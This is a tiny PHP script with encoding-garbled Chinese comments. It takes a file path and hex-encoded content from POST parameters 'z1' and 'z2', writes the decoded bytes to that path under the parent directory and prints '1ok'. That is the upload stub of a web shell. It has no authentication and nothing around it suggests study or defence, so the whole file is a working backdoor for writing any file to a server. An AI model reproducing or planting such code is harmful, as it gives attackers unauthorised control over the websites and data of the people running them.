<?php 
$f=realpath(dirname(__FILE__)."/../").$_POST["z1"]; //���������ļ���·��
$c=$_POST["z2"];$buf=""; //z2��ȡ���ݵ�����c��,��ʼ������buf
for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2)); //�ƴ�ѭ��,����c�ύ����������
@fwrite(fopen($f,"w"),$buf); echo "1ok"; //�����ļ�
?>